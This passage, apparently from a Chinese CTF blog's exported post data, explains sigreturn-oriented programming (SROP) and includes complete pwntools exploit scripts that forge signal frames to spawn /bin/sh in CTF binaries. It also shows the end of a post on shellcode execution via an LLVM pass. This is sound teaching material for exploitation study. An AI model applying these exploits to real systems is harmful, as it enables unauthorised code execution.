*)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);</span><br><span class="line">    SExtValue = llvm::ConstantInt::getSExtValue(v2);</span><br><span class="line">    `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeMovImm64(this, <span class="number">0</span>, SExtValue);</span><br><span class="line">    <span class="keyword">return</span> `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeRet(this);</span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// callCode函数：</span></span><br><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::MBAPass::callCode(</span><br><span class="line">        __int64 (__fastcall **this)(_anonymous_namespace_::MBAPass *, __int64),</span><br><span class="line">        __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> this[<span class="number">4</span>]((_anonymous_namespace_::MBAPass *)this, a2);	<span class="comment">//填入我们的shellcode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先开辟一块0x1000的可读可写区域；再通过handle函数对IR代码进行优化；接着将开辟的0x1000的区域提高权限为可读可执行；最后调用callCode函数。很明显，这就是需要我们写入shellcode然后利用callCode函数进行执行。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>Srop</title>
    <url>/2022/04/16/Pwn/Srop/</url>
    <content><![CDATA[<h2 id="srop利用原理"><a href="#srop利用原理" class="headerlink" title="srop利用原理"></a>srop利用原理</h2><h3 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h3><p>当有中断或者异常产生时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存相应的上下文（<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向sigreturn 的系统调用地址，需要注意的是，这一部分是在用户进程的地址空间的</strong>），在跳转到之前注册好的signal handler中进行处理，等到signal handler返回后，内核为该进程恢复保存的上下文，最终恢复执行。</p>
<p>具体步骤如下：</p>
<ol>
<li>一个signal frame被添加到栈，这个frame中包含了当前寄存器的值和一些signal信息</li>
<li>一个新的返回地址被添加到栈顶，其指向了sigreturn</li>
<li>signal handler被调用，signal handler的行动取决于收到什么signal</li>
<li><strong>signal handler执行完之后，返回地址用于执行sigreturn系统调用</strong></li>
<li><strong>sigreturn利用signal frame恢复寄存器回到之前的状态</strong></li>
<li>程序继续执行</li>
</ol>
<!-- more -->

<h3 id="x86和x64的sigcontext"><a href="#x86和x64的sigcontext" class="headerlink" title="x86和x64的sigcontext"></a>x86和x64的sigcontext</h3><ul>
<li><strong>x86：</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  unsigned short gs, __gsh;</span><br><span class="line">  unsigned short fs, __fsh;</span><br><span class="line">  unsigned short es, __esh;</span><br><span class="line">  unsigned short ds, __dsh;</span><br><span class="line">  unsigned long edi;</span><br><span class="line">  unsigned long esi;</span><br><span class="line">  unsigned long ebp;</span><br><span class="line">  unsigned long esp;</span><br><span class="line">  unsigned long ebx;</span><br><span class="line">  unsigned long edx;</span><br><span class="line">  unsigned long ecx;</span><br><span class="line">  unsigned long eax;</span><br><span class="line">  unsigned long trapno;</span><br><span class="line">  unsigned long err;</span><br><span class="line">  unsigned long eip;</span><br><span class="line">  unsigned short cs, __csh;</span><br><span class="line">  unsigned long eflags;</span><br><span class="line">  unsigned long esp_at_signal;</span><br><span class="line">  unsigned short ss, __ssh;</span><br><span class="line">  struct _fpstate * fpstate;</span><br><span class="line">  unsigned long oldmask;</span><br><span class="line">  unsigned long cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>x64：（大小为0x100)</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct _fpstate</span><br><span class="line">&#123;</span><br><span class="line">  /* FPU environment matching the 64-bit FXSAVE layout.  */</span><br><span class="line">  __uint16_t        cwd;</span><br><span class="line">  __uint16_t        swd;</span><br><span class="line">  __uint16_t        ftw;</span><br><span class="line">  __uint16_t        fop;</span><br><span class="line">  __uint64_t        rip;</span><br><span class="line">  __uint64_t        rdp;</span><br><span class="line">  __uint32_t        mxcsr;</span><br><span class="line">  __uint32_t        mxcr_mask;</span><br><span class="line">  struct _fpxreg    _st[8];</span><br><span class="line">  struct _xmmreg    _xmm[16];</span><br><span class="line">  __uint32_t        padding[24];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  __uint64_t r8;</span><br><span class="line">  __uint64_t r9;</span><br><span class="line">  __uint64_t r10;</span><br><span class="line">  __uint64_t r11;</span><br><span class="line">  __uint64_t r12;</span><br><span class="line">  __uint64_t r13;</span><br><span class="line">  __uint64_t r14;</span><br><span class="line">  __uint64_t r15;</span><br><span class="line">  __uint64_t rdi;</span><br><span class="line">  __uint64_t rsi;</span><br><span class="line">  __uint64_t rbp;</span><br><span class="line">  __uint64_t rbx;</span><br><span class="line">  __uint64_t rdx;</span><br><span class="line">  __uint64_t rax;</span><br><span class="line">  __uint64_t rcx;</span><br><span class="line">  __uint64_t rsp;</span><br><span class="line">  __uint64_t rip;</span><br><span class="line">  __uint64_t eflags;</span><br><span class="line">  unsigned short cs;</span><br><span class="line">  unsigned short gs;</span><br><span class="line">  unsigned short fs;</span><br><span class="line">  unsigned short __pad0;</span><br><span class="line">  __uint64_t err;</span><br><span class="line">  __uint64_t trapno;</span><br><span class="line">  __uint64_t oldmask;</span><br><span class="line">  __uint64_t cr2;</span><br><span class="line">  __extension__ union</span><br><span class="line">    &#123;</span><br><span class="line">      struct _fpstate * fpstate;</span><br><span class="line">      __uint64_t __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  __uint64_t __reserved1 [8];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="signal机制漏洞利用"><a href="#signal机制漏洞利用" class="headerlink" title="signal机制漏洞利用"></a>signal机制漏洞利用</h3><ul>
<li>Signal Frame 被保存在用户的地址空间中，<strong>所以用户是可以读写的</strong>。</li>
<li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，<strong>它并不会去记录这个 signal 对应的 Signal Frame</strong>，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li>
<li><strong>32位sigreturn的系统调用号为77、64位sigreturn的系统调用号为15</strong></li>
</ul>
<h2 id="srop基本利用"><a href="#srop基本利用" class="headerlink" title="srop基本利用"></a>srop基本利用</h2><blockquote>
<p>参考文章：</p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_4">SROP - CTF Wiki (ctf-wiki.org)</a></p>
<p>[(11条消息) <a href="https://blog.csdn.net/mcmuyanga/article/details/112509274">BUUCTF]PWN——ciscn_2019_es_7[详解]_Angel~Yan的博客-CSDN博客_ciscn_2019_es_7</a></p>
</blockquote>
<h3 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h3><p>给了一个gadget：<code>mov rax, 0xf; ret</code>，设置rax的值为15，然后再调用syscall，就可以实现调用sigreturn。</p>
<p>WP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./ciscn_2019_es_7&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node4.buuoj.cn&quot;, 29776)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4004f1</span></span><br><span class="line">gadget = <span class="number">0x4004DA</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_addr:&quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = leak_addr - <span class="number">0x118</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = ret</span><br><span class="line">sigframe.rip = syscall</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(gadget) + p64(syscall) + <span class="built_in">str</span>(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="srop进阶"><a href="#srop进阶" class="headerlink" title="srop进阶"></a>srop进阶</h2><h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>当我们希望执行一系列函数的时候，如下图所示：</p>
<p><img src="https://s1.ax1x.com/2022/10/16/xBmL3F.png" alt="srop1"></p>
<p>需要注意的是，我们利用SROP需要满足以下条件：</p>
<ul>
<li>可以控制栈的内容</li>
<li>需要知道以下地址：<ul>
<li>“&#x2F;bin&#x2F;sh”</li>
<li>signal frame</li>
<li>syscall</li>
<li>sigreturn</li>
</ul>
</li>
<li>要有足够大的空间容纳signa frame</li>
</ul>
<p>有的时候我们无法找到控制rax的可用gadget，我们可以在调用syscall ret前，利用某些函数的返回值来控制rax，例如read函数</p>
<h3 id="可利用的gadget"><a href="#可利用的gadget" class="headerlink" title="可利用的gadget"></a>可利用的gadget</h3><p><img src="https://s1.ax1x.com/2022/10/16/xBmq9U.png" alt="srop2"></p>
<p>该技术将内核中一些变量和特定系统调用的实现映射到用户态，程序在调用时就不需要再切入内核，从而加快执行速度，<strong>vsyscall是从固定地址0xffffffffff600000开始，三个系统调用以0x400字节对齐，其他内存以int3指令填充，权限为可读可执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xffffffffff600000:		mov	rax,0x60</span><br><span class="line">0xffffffffff600007:		syscall</span><br><span class="line">0xffffffffff600009:		ret</span><br><span class="line">0xffffffffff60000a:		int3</span><br><span class="line"></span><br><span class="line">0xffffffffff600400:		mov	rax,0xc9</span><br><span class="line">0xffffffffff600407:		syscall</span><br><span class="line">0xffffffffff600409:		ret</span><br><span class="line">0xffffffffff60040a:		int3</span><br><span class="line"></span><br><span class="line">0xffffffffff600800:		mov	rax,0x135</span><br><span class="line">0xffffffffff600807:		syscall</span><br><span class="line">0xffffffffff600809:		ret</span><br><span class="line">0xffffffffff60080a:		int3</span><br></pre></td></tr></table></figure>

<p>我们只需要先控制rax的值为0xf，再调用syscall ret就可以调用sigreturn</p>
<h3 id="具体的利用流程"><a href="#具体的利用流程" class="headerlink" title="具体的利用流程"></a>具体的利用流程</h3><ol>
<li>利用栈溢出将返回地址覆盖为sigreturn的地址，并在栈上布置fake frame，结构如下：</li>
</ol>
<ul>
<li><strong>RSP：一个可写的地址</strong></li>
<li><strong>RIP：syscall ret</strong></li>
<li><strong>RAX：read的系统调用号</strong></li>
<li><strong>RDI：文件描述符</strong></li>
<li><strong>RSI：可写的地址</strong></li>
<li><strong>RDX：读入的字节数，取306</strong></li>
</ul>
<ol start="2">
<li>sigreturn执行完后，执行syscall ret，向可写的地址读入306个字节，<strong>这块内容要包含3个syscall ret、fake frame和其他代码和数据</strong></li>
<li>read执行完后，返回值被放入rax中，然后再次执行我们布置的syscall ret，<strong>但由于rax的值为306，即syncfs的系统调用号，而该调用总返回0，0又是read的调用号</strong></li>
<li>这次执行我们布置的第二个syscall ret，即read的调用，<strong>这时候我们输入的内容不重要，主要是字节数，输入15个字节，即sigreturn的系统调用</strong></li>
<li>执行第三个syscall ret，即sigreturn，从第二个fake frame中恢复数据，可以是执行execve(“&#x2F;bin&#x2F;sh”, 0, 0)，也可以是调用mprotect</li>
</ol>
<p>以下是示意图：</p>
<p><img src="https://s1.ax1x.com/2022/10/16/xBmHhT.png" alt="srop3"></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>可使用的gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syscall</span><br><span class="line">add rsp, 0x10</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>这里的利用是参照了上文写的流程，要注意的是，这里运用的gadget多了<code>add rsp,0x10</code>的操作，所以在构造fake_frame和控制程序执行流的时候要额外注意rsp的值。</p>
<p>WP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./TNT&quot;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">xor_rax = <span class="number">0x4000f2</span></span><br><span class="line">syscall_rsp_ret = <span class="number">0x400100</span></span><br><span class="line">area = <span class="number">0x600000</span></span><br><span class="line"></span><br><span class="line">frame1 = SigreturnFrame()</span><br><span class="line">frame1.rax = constants.SYS_read</span><br><span class="line">frame1.rdi = <span class="number">0</span></span><br><span class="line">frame1.rsi = area</span><br><span class="line">frame1.rdx = <span class="number">306</span></span><br><span class="line">frame1.rsp = area - <span class="number">0x10</span></span><br><span class="line">frame1.rip = syscall_rsp_ret</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(xor_rax)</span><br><span class="line">payload1 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(syscall_rsp_ret)</span><br><span class="line">payload1 += <span class="built_in">str</span>(frame1)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line">frame2 = SigreturnFrame()</span><br><span class="line">frame2.rax = constants.SYS_execve</span><br><span class="line">frame2.rdi = area + <span class="number">8</span>*<span class="number">4</span></span><br><span class="line">frame2.rsi = <span class="number">0</span></span><br><span class="line">frame2.rdx = <span class="number">0</span></span><br><span class="line">frame2.rip = syscall_rsp_ret</span><br><span class="line"></span><br><span class="line">payload2 = p64(syscall_rsp_ret) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload2 += p64(syscall_rsp_ret) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2 += p64(syscall_rsp_ret)</span><br><span class="line">payload2 += <span class="built_in">str</span>(frame2)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">306</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Srop</tag>
      </tags>
  </entry>
</search>
